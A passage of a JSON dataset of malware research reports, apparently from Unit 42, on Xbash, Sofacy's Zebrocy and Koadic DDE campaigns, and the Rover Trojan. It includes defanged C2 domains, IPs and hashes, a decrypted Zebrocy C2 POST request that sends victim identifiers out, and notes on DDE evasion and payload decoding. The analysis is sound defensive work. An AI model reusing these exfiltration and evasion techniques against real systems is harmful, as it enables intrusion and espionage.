            "content": [
                "Figure 6\u00a0 Incoming transactions to one of bitcoin wallets"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "However, as is so often the case, we see no evidence that the attackers are actually making good on their promise and helping the victims restore their deleted databases.",
                "In fact, contrary to the ransom note, we found NO evidence of code in Xbash that backs up the deleted databases at all."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Exploit for Propagation"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When Xbash finds a destination has Hadoop, Redis or ActiveMQ running, it will also attempt to exploit the service for self-propagation.",
                "Three known vulnerabilities are targeted:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7\u00a0 Xbash exploiting Redis vulnerability"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When the exploit succeeds, Xbash will either directly execute a shell command to download and to run malicious Shell or Python scripts, or create new cron job to do the same, again as shown in Figure 6.",
                "The malicious scripts were downloaded from the same C2 servers as Xbash used.",
                "In either instance, their main functions are to kill other popular Coinminers, download Coinminers developed by the Iron cybercrime group, and download Xbash itself onto the target system for further propagation."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The net of this is that Xbash targets and uses vulnerable Hadoop, Redis or ActiveMQ systems both to run the attackers coinminer AND propagate Xbash within the environment."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Infecting Windows Servers"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Another notable feature of Xbash is the way it uses Redis and an HTTP service to determine if the vulnerable Redis service is installed on Linux or Microsoft Windows.",
                "If the destination being scanned has both vulnerable Redis service and a HTTP service running, Xbash will try to use information leaked by the Redis vulnerability to guess HTTP web servers installation location.",
                "Xbash then uses the location to guess which operating system (Linux or Windows) the destination is running as shown in Figure 7."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8\u00a0 Web server paths Xbash used to determine operating system"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If it believes its found a Windows server, Xbash will exploit the Redis vulnerability to create a Windows startup item (as shown in Figure 6), instead of a Linux cronjob.",
                "Depends on Xbashs version, this new startup item will download a malicious HTML or a Scriptlet file from Xbashs C2 server, and to execute the JavaScript or VBScript code in the file via mshta or via regsvr32.",
                "These scripts will then invoke PowerShell to download a malicious PE executable or PE DLL file from the same C2 server for execution as shown in Figure 8."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8\u00a0 Malicious JavaScript code to be executed in vulnerable Windows server (with comments)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Through our investigation we found that these malicious PE files were coinminer or ransomware developed by the Iron cybercrime group as shown in Figure 9."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 9\u00a0 AutoFocus associated the malicious PE file with Iron cybercrime group"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Targeting Enterprise Intranet"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In all versions of Xbash we found, there is a Python class named LanScan.",
                "Its functions are to get local intranet information, generate a list of all IP addresses within the same subnet, and to perform port scanning to all these IPs as shown in figure 10.",
                "It appears that during its evolution, the author was adding more ports to this piece of code.",
                "However, the code was inert and unutilized: it is still standalone and yet to be connected with the main part of the code.",
                "We believe the author may enable this functionality in coming versions."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 10\u00a0 Generate list of IP addresses in victim\u2019s subnet and perform port scanning"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In an enterprise network (including office network and datacenter or private cloud), there are usually more servers providing services internally than to public.",
                "And these services are also more likely unprotected or configured with weak password.",
                "The chance of find vulnerable services within Intranet is much higher than over Internet.",
                "We believe that is the main motivation of Xbashs Intranet scanning code.",
                "If events like WannaCry and NotPetya are any guide, this intranet functionality could make Xbash even more devastating once its enabled."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusions"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Xbash is a novel and complex Linux malware and the newest work of an active cybercrime group.",
                "From its characteristics and behaviors, we could realize many trends in current IoT/Linux security battleground:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from this threat:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Indicators of Compromise"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Samples for Linux"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7a18c7bdf0c504832c8552766dcfe0ba33dd5493daa3d9dbe9c985c1ce36e5aa zlibx"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0b9c54692d25f68ede1de47d4206ec3cd2e5836e368794eccb3daa632334c641 Xbash"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "dbc380cbfb1536dfb24ef460ce18bccdae549b4585ba713b5228c23924385e54 xapache"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5b790f02bdb26b6b6b270a5669311b4f231d17872aafb237b7e87b6bbb57426d libhttpd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e59be6eec9629d376a8a4a70fe9f8f3eec7b0919019f819d44b9bdd1c429277c XbashX"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f808a42b10cf55603389945a549ce45edc6a04562196d14f7489af04688f12bc XbashY"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "dcd37e5b266cc0cd3fab73caa63b218f5b92e9bd5b25cf1cacf1afdb0d8e76ff",
                "rootv2.sh"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "de63ce4a42f06a5903b9daa62b67fcfbdeca05beb574f966370a6ae7fd21190d lowerv2.sh"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "09968c4573580398b3269577ced28090eae4a7c326c1a0ec546761c623625885 rootv2.sh"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a27acc07844bb751ac33f5df569fd949d8b61dba26eb5447482d90243fc739af r88.sh"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Samples for Windows"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f888dda9ca1876eba12ffb55a7a993bd1f5a622a30045a675da4955ede3e4cb8 tt.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "31155bf8c85c6c6193842b8d09bda88990d710db9f70efe85c421f1484f0ee78 tg.jpg"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "725efd0f5310763bc5375e7b72dbb2e883ad90ec32d6177c578a1c04c1b62054 reg9.sct"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d7fbd2a4db44d86b4cf5fa4202203dacfefd6ffca6a0615dca5bc2a200ad56b6 m.png"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ece3cfdb75aaabc570bf38af6f4653f73101c1641ce78a4bb146e62d9ac0cd50 tmp.jpg"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Downloading URLs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://3g2upl4pq6kufc4m[.]tk/zlibx"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://e3sas6tzvehwgpak[.]tk/XbashY"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://3g2upl4pq6kufc4m[.]tk/XbashY"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://3g2upl4pq6kufc4m[.]tk/xapache"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://3g2upl4pq6kufc4m[.]tk/libhttpd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://xmr.enjoytopic[.]tk/l/rootv2.sh"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://xmr.enjoytopic[.]tk/l2/rootv2.sh"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://xmr.enjoytopic[.]tk/l/r88.sh"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://xmr.enjoytopic[.]tk/12/r88.sh"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://e3sas6tzvehwgpak[.]tk/lowerv2.sh"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://3g2upl4pq6kufc4m[.]tk/r88.sh"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://e3sas6tzvehwgpak[.]tk/XbashY"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://e3sas6tzvehwgpak[.]tk/XbashX"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://png.realtimenews[.]tk/m.png"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://daknobcq4zal6vbm[.]tk/tt.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://d3goboxon32grk2l[.]tk/reg9.sct"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Domains for C2 Communication"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ejectrift.censys[.]xyz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "scan.censys[.]xyz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "api.leakingprivacy[.]tk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "news.realnewstime[.]xyz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "scan.realnewstime[.]xyz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "news.realtimenews[.]tk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "scanaan[.]tk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "scan.3g2upl4pq6kufc4m[.]tk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "scan.vfk2k5s5tfjr27tz[.]tk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "scan.blockbitcoin[.]tk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "blockbitcoin[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IPs for C2 Communication"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "142.44.215[.]177"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "144.217.61[.]147"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "URLs for C2 Domain Updating"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://pastebin[.]com/raw/Xu74Mzif"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://pastebin[.]com/raw/rBHjTZY6"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Bitcoin Wallet Addresses in Ransom Messages"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1Kss6v4eSUgP4WrYtfYGZGDoRsf74M7CMr"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1jqpmcLygJdH8fN7BCk2cwwNBRWqMZqL1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1ExbdpvKJ6M1t5KyiZbnzsdQ63SEsY6Bff"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Email Addresses in Ransom Messages"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "backupsql@protonmail[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "backupsql@pm[.]me"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "backupdatabase@pm[.]me"
            ]
        }
    ],
    "6ae11b2da85added3a2ee13502ff7379fdd3986c": [
        {
            "type": "paragraph",
            "content": [
                "Summary\nThe Sofacy group remains a persistent global threat.",
                "Unit 42 and others have shown in the first half of 2018 how this threat actor group continues to target multiple organizations throughout the world with a strong emphasis on government, diplomatic and other strategic organizations primarily in North America and Europe.",
                "Following up our most recent Sofacy research in February and March of 2018, we have found a new campaign that uses a lesser known tool widely attributed to the Sofacy group called Zebrocy.",
                "Zebrocy is delivered primarily via phishing attacks that contain malicious Microsoft Office documents with macros as well as simple executable file attachments.",
                "This third campaign is consistent with two previously reported attack campaigns in terms of targeting: the targets were government organizations dealing with foreign affairs.",
                "In this case however the targets were in different geopolitical regions.",
                "An interesting difference we found in this newest campaign was that the attacks using Zebrocy cast a far wider net within the target organization: the attackers sent phishing emails to a an exponentially larger number of individuals.",
                "The targeted individuals did not follow any significant pattern, and the email addresses were found easily using web search engines.",
                "This is a stark contrast with other attacks commonly associated with the Sofacy group where generally no more than a handful of victims are targeted within a single organization in a focus-fire style of attack.",
                "In addition to the large number of Zebrocy attacks we discovered, we also observed instances of the Sofacy group leveraging the Dynamic Data Exchange (DDE) exploit technique previously documented by McAfee.",
                "The instances we observed, however, used the DDE exploit to deliver different payloads than what was observed previously.",
                "In one instance the DDE attack was used to deliver and install Zebrocy.",
                "In another instance, the DDE attack was used to deliver an open-source penetration testing toolkit called Koadic.",
                "The Sofacy group has leveraged open source or freely available tools and exploits in the past but this is the first time that Unit 42 has observed them leveraging the Koadic toolkit."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Links to previous attacks\nIn our February report, we discovered the Sofacy group using Microsoft Office documents with malicious macros to deliver the SofacyCarberp payload to multiple government entities.",
                "In that report, we documented our observation that the Sofacy group appeared to use conventional obfuscation techniques to mask their infrastructure attribution by using random registrant and service provider information for each of their attacks.",
                "In particular, we noted that the Sofacy group deployed a webpage on each of the domains.",
                "This is odd because attackers almost never set up an actual webpage on adversary C2 infrastructure.",
                "Even stranger, each webpage contained the same content within the body.",
                "Since that report, we continued our research into this oddity.",
                "Using this artifact, we were able to pivot and discover another attack campaign using the DealersChoice exploit kit with similar victimology to what we saw in February.",
                "Continuing to use this artifact, we discovered another domain with the same content body, supservermgr[.]com.",
                "This domain was registered on December 20, 2017 and within a few days was resolving to 92.222.136[.]105, which belonged to a well-known VPS provider often used by the Sofacy group.",
                "Unfortunately, at the time of collection, the C2 domain had been sinkholed by a third party.",
                "Based on dynamic and static analysis of the malware sample associated with the supservermgr[.]com domain however, we were able to determine several unique artifacts which allowed us to expand our dataset and discover additional findings.",
                "First, we determined the sample we collected, d697160ae was attempting to communicate to its C2 at hxxp://supservermgr[.]com/sys/upd/pageupd.php to retrieve a Zebrocy AutoIT downloader.",
                "Because the domain had been sinkholed, this activity could not be completed.",
                "However, we were able determine a unique, hard-coded user agent used for the C2 communications:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using AutoFocus, we pivoted from the user agent string to expand our data set to three additional Zebrocy samples using the exact same user agent.",
                "This led us to additional infrastructure for Zebrocy at 185.25.51[.]198 and 185.25.50[.]93.",
                "At this point we had collected nearly thirty samples of Zebrocy in relation to the original sample and its associated C2 domain.",
                "Additional pivoting based on artifacts unique to this malware family expanded our dataset to hundreds of samples used over the last several years.",
                "Most of the additional samples were the Delphi and AutoIT variants as reported by ESET.",
                "However, several of the collected samples were a C++ variant of theZebrocy downloader tool.",
                "In addition, we discovered evidence of a completely different payload in Koadic being delivered as well.",
                "Also, we found the IP address 185.25.50[.]93 hosting C2 services for a Delphi backdoor that ESET's report states is the final stage payload for these attacks.",
                "A Maltego chart diagramming the relational analysis we performed is below:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Visualization of relationships"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Please note this is not a comprehensive chart of all Zebrocy and Koadic samples we were able to collect.",
                "Only samples mentioned or relevant to the relational analysis have been included.",
                "From the 185.25.50[.]93 C2 IP, we discovered another hard-coded user agent being used by Zebrocy:\nMozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko\nWe observed several samples of Zebrocy using this user agent targeting the foreign affairs ministry of a large Central Asian nation.",
                "Pivoting off of this artifact provided us additional Zebrocy samples.",
                "One sample in particular, cba5ab65a used yet another unique user agent string in combination with the previous user agent for its C2:\nMozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1\nA malware sample using two separate unique user agent strings is uncommon.",
                "A closer examination of the tool revealed the second user agent string was from a secondary payload that was retrieved by the cba5ab65a sample.",
                "Pivoting from the Mozilla v5.1 user agent revealed over forty additional Zebrocy samples, with several again targeting the same Central Asian nation.",
                "Two samples specifically, 25f0d1cbc and 115fd8c61 provided additional artifacts we were able to pivot from to discover weaponized documents to deliver Zebrocy as well as a Koadic.",
                "Examining the use of the unique user agents strings over time shows that while previously only the Mozilla/5.0 user agent was in use, since mid 2017 all three user agent strings have been used by the Zebrocy tool for its C2 communications."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Timeline of User Agents"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "DDE Documents\nThe two weaponized documents we discovered leveraging DDE were of particular interest due to victimology and a change in tactics.",
                "While examining 25f0d1cbc, we were able to pivot from its C2 220.158.216[.]127 to gather additional Zebrocy samples as well as a weaponized document.",
                "This document (85da72c7d) appears to have been targeting a North American government organization dealing with foreign affairs.",
                "It leveraged DDE to retrieve and install a payload onto the victim host.",
                "A decoy document is deployed in this attack, with the contents purporting be a publicly available document from the United Nations regarding the Republic of Uzbekistan."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Example of delivery document"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Lure image used"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The creator of the weaponized document appended their DDE instructions to the end of the document after all of the decoy contents.",
                "When the document is opened in Word, the instructions are not immediately visible, as Word does not display these fields contents by default.",
                "As you can see in the following screenshot, simply attempting to highlight the lines in which the DDE instructions reside does not display them."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 Hidden DDE commands"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Enabling the Toggle Field Codes feature reveals the DDE instructions to us and shows that the author had set instructions to size 1 font and with a white coloring.",
                "The use of a white font coloring to hide contents within a weaponized document is a technique we had previously reported being used by the Sofacy group in a malicious macro attack.",
                "The DDE instructions attempt to run the following the following command on the victim host, which attempts to download and execute a payload from a remote server:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "During our analysis, we observed this DDE downloading and executing a Zebrocy AutoIt downloader (f27836430), configured to attempt to download an additional payload from 220.158.216[.]127.",
                "The DDE instructions also included another command that it did not run, which suggests it is an artifact of a prior version of this delivery document.",
                "The following shows this unused command, which exposed an additional server within Sofacys infrastructure would download and execute an encoded PowerShell script from 92.114.92[.]102:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The unused command above appears to be related to previous attacks, specifically attacks that occurred in November 2017 as discussed by McAfee and ESET.",
                "The payload delivered in these November 2017 attacks using DDE enabled documents was SofacyCarberp, which differs from the Zebrocy downloader delivered in the February 2018 attacks.",
                "115fd8c61 was another Zebrocy sample we were able to pivot from by gathering additional samples connecting to its C2 86.106.131[.]177.",
                "The additional samples targeted the same large Central Asian nation state as previously mentioned but more interestingly, one of the samples was a weaponized document also leveraging DDE and containing a non-Zebrocy payload.",
                "The payload turned out to be an open source penetration test toolkit called Koadic.",
                "It is a toolkit similar to Metasploit or PowerShell Empire and is freely available to anyone on Github."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 Example of delivery document"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The RTF document (8cf3bc2bf...) was very small in size at 264 bytes, which can be seen in its entirety here:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The contents above use the DDE functionality in Microsoft Word to run a PowerShell script to download the Koadic payload from a remote server, save it as an executable file on the system and then execute the payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion\nThe Sofacy group continues their targeted attack campaigns in 2018.",
                "As mentioned in this blog, Sofacy is carrying out parallel campaigns to attack similar targets around the world but with different toolsets.",
                "The Zebrocy tool associated with this current strain of attacks is constructed in several different forms based on the programming language the developer chose to create the tool.",
                "We have observed Delphi, AutoIt, and C++ variants of Zebrocy, all of which are related not only in their functionality, but also at times by chaining the variants together in a single attack.",
                "These attacks are still largely perpetrated via spear phishing campaigns, whether via simple executable attachments in hopes that a victim will launch the file to using a previously observed DDE exploitation technique.",
                "Palo Alto Networks customers are protected from Zebrocy and Koadic attacks by:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix\nZebrocy C++ Variant\nOn February 19, 2018, we saw a spear phishing email sent to a foreign affairs organization within a Central Asian country, which attempted to delivered an attached Zebrocy downloader (5b5e80f63...) written in the Delphi programming language.",
                "This downloader obtained a second downloader, which in this case was very similar in functionality but was written in C++ instead of Delphi.",
                "This variation of the Zebrocy downloader begins by gathering the serial number for the storage volume with the label \"C:\\\" and the computer name.",
                "It then creates an invisible window (0x0 pixel) in the bottom right corner of the screen, which will call the main function of the Trojan.",
                "The main function of the Trojan interacts with its configured C2 server to obtain additional code to execute.",
                "The main function gets pertinent strings to communicate with its C2 by calling a sub-function with a specific number that the sub-function uses as a case within a switch statement to decrypt the desired string.",
                "For instance, here are the resulting decrypted strings from each of the case statements (dd7e69e1...):\nCase - String decrypted\n1 - 185.25.50[.]93\n2 - POST http://185.25.50[.]93/syshelp/kd8812u/protocol.php HTTP/1.1\\r\\nHost: 185.25.50[.]93\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length:\n3 - porg=\n4 - Content-Length:\nThe Trojan uses raw sockets to communicate with its C2 server and uses the decrypted string above to create HTTP requests.",
                "It starts by calling this specific sub-function with an argument of 1 to get the IP address for the C2 to connect.",
                "It then calls the subfunction with the argument of 2 to get the string that it will use as the HTTP POST request.",
                "The main function then calls the subfunction with the argument 3 to get the POST data parameter (porg) along with the volume serial number and computer name and will send this data to the C2 via the HTTP POST request.",
                "The resulting HTTP POST request looks like the following:\nPOST http://185.25.50[.]93/syshelp/kd8812u/protocol.php HTTP/1.1\nHost: 185.25.50[.]93\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 21\nporg=44908AE0524f422d\nWe have not seen a C2 server respond to our requests during our analysis, however, we do know how the Trojan will parse the C2's response for specific data.\n-1 - Deletes the buffer and exits the Trojan.\n009 - Deletes the buffers and exits the Trojan.",
                "If neither of the above values are found at the beginning of the HTTP response, the Trojan checks the C2 response for the ASCII representation of hexadecimal bytes.",
                "The Trojan will convert these hexadecimal bytes to their binary values and write them to a file and will run the file using the \"open\" function using the ShellExecuteW API function.",
                "We have seen the following HTTP POST parameters within the Zebrocy C++ samples:\nporg\nstructOne\noq\nvolume\nDDE Details\nThe author of the DDE document used in the February 2018 attacks used some obfuscation techniques in an attempt to evade detection.",
                "First, the DDE instructions heavily rely on the QUOTE field, which converts decimal values to their ASCII equivalent character.",
                "Also, the author capitalized the E in the dde command to evade case sensitive signatures.",
                "Lastly, the author bolded the dd characters within the dde command, which breaks the string up within the XML of the DOCX file (word/document.xml) to make signature development difficult, as seen here:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In addition to the aforementioned DOCX file, we found another related DDE enabled document based on an infrastructure overlap with a Zebrocy C2 IP address.",
                "This related delivery document was an RTF file that downloaded and installed a payload used to load the open-source Koadic tool.",
                "We do not have telemetry on the target or attack vector, but we know the RTF file used DDE to download and execute an executable that loaded Koadic.",
                "The payload (abbad7acd...) is an executable that appears to have been created by a VBScript to Executable tool and further obfuscated with a cryptor.",
                "Our analysis shows some possible ties to the Vbs to Exe tool by F2KO Software but we have yet to confirm a direct overlap.",
                "We believe the actor used a cryptor on the payload, as it obtains a filename and script from within its resources and decodes these resources by multiplying each byte by negative one.",
                "The payload then uses the MD5 hash (14331d289e737093994395d3fc412afc) of what appears to be a hardcoded SHA1 hash (B6A75B1EF701710D7AEADE0FE93DE8477F3BD506) as an RC4 key to decrypts the resulting decoded data.",
                "For instance, the following data exists within a resource:\nfb 70 b0 c9 bd c5 8a d4 0c 54 fd 4c 6d bb f0 0f\nBy multiplying each byte with -1, we obtain the following data:\n05 90 50 37 43 3b 76 2c f4 ac 03 b4 93 45 10 f1\nAfter using RC4 and the key 14331d289e737093994395d3fc412afc, the following cleartext data appears:\n\\x00\\x00\\x00\\x00FlashRun.vbs\nWe do not see the payload using this FlashRun.vbs filename, instead it uses a temporary file name to store an embedded VBScript file, such as %Temp%\\4.tmp\\5.vbs.",
                "The embedded VBScript is retrieved from a resource and decrypted using the same algorithm as discussed above, which results in the following cleartext:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Koadic C2 server will respond to this request with Javascript code that acts as the Koadic staging payload, which allows the actor to run additional Koadic modules on the end system to carry out their post-exploitation activities.",
                "Unfortunately, we did not observe the Koadic modules used by Sofacy during out analysis."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IOCs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Domain"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "supservermgr[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "URL"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://supservermgr[.]com/sys/upd/pageupd.php"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Zebrocy"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d697160aecf152a81a89a6b5a7d9e1b8b5e121724038c676157ac72f20364edc\ncba5ab65a24be52214736bc1a5bc984953a9c15d0a3826d5b15e94036e5497df\n25f0d1cbcc53d8cfd6d848e12895ce376fbbfaf279be591774b28f70852a4fd8\n115fd8c619fa173622c7a1e84efdf6fed08a25d3ca3095404dcbd5ac3deb1f03\nf27836430742c9e014e1b080d89c47e43db299c2e00d0c0801a2830b41b57bc1\n5b5e80f63c04402d0b282e95e32155b2f86cf604a6837853ab467111d4ac15e2\ndd7e69e14c88972ac173132b90b3f4bfb2d1faec15cca256a256dd3a12b6e75d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Koadic"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "abbad7acd50754f096fdc6551e728aa6054dcf8e55946f90a02b17db552471ca"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "User Agents"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IPs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "185.25.51[.]198\n185.25.50[.]93\n220.158.216[.]127\n92.114.92[.]102\n86.106.131[.]177"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "DDE Docs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "85da72c7dbf5da543e10f3f806afd4ebf133f27b6af7859aded2c3a6eced2fd5\n8cf3bc2bf36342e844e9c8108393562538a9af2a1011c80bb46416c0572c86ff"
            ]
        }
    ],
    "718516a55824f538075d8d242d99d8f948756a26": [
        {
            "type": "paragraph",
            "content": [
                "On December 24, 2015, Unit 42 identified a targeted attack, delivered via email, on a high profile Indian diplomat, an Ambassador to Afghanistan.",
                "The body and content of the email suggest that it was crafted and spoofed to look like it was sent by the current Defence Minister of India, Mr. Manohar Parrikar, commending the Ambassador on his contributions and success."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "India has been a key nation in building and funding Afghanistans infrastructure and economic development, which includes setting up iron ore mines, steel plants, power plants and transportation systems, helping reconstruct the Salma Dam and constructing a new Parliament Complex for the Afghan Government."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Given Indias significant contributions to the development of Afghanistan, it is likely that there may be groups or nations who would be interested in tracking and spying on key individuals who officially represent India in Afghanistan."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1 gives an overview of the exploitation, infection and C2 communications of the 'Rover' Trojan campaign targeting a victim running Windows XP."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1: Overviewof the infection flow and C2 communications"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Rover Trojan Infection Steps:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 2 shows an email which was sent to the Ambassador of India, appearing to commend the contributions the Ambassador has made in the development and success of projects on national interest, and attaching a letter of appreciation with a file name, Appreciation_letter.doc."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The attachment is an RTF file which exploits a specific vulnerability in Microsoft Word, CVE-2010-3333."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 2: Spear phishing email sent to the Ambassador of Afghanistan"
            ]
        },
        {
            "type": "caption",
            "content": [
                "If the recipient of the e-mail opened the attachment in a vulnerable version of Word, the exploit code would download and execute a file from the domain newsumbrella[.]net as shown in Figure 3 below."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 3: Hexdump showing the domain and the executable downloaded"
            ]
        },
        {
            "type": "caption",
            "content": [
                "During the time of analysis the executable file systemupdateAPI.exe was no longer being hosted on the newsumbrealla[.]net domain.",
                "However, we have noticed the same domain hosting another executable in the past within the same parent directory and having a similar naming for the folders as shown below"
            ]
        },
        {
            "type": "caption",
            "content": [
                "newsumbrella[.]net/ne3s/lat3st/w0rld/systemupdateAPI[.]exe"
            ]
        },
        {
            "type": "caption",
            "content": [
                "newsumbrella[.]net/ne3s/file[.]exe \u2013 hosted earlier"
            ]
        },
        {
            "type": "caption",
            "content": [
                "We believe that the executables hosted under the parent directory \u2018ne3s\u2019 are variants of the same downloader Trojan, which was used to download the Rover Trojan.",
                "The file, file.exe, contains the following debug information that indicates the file was originally named systemupdateAPI.exe."
            ]
        },
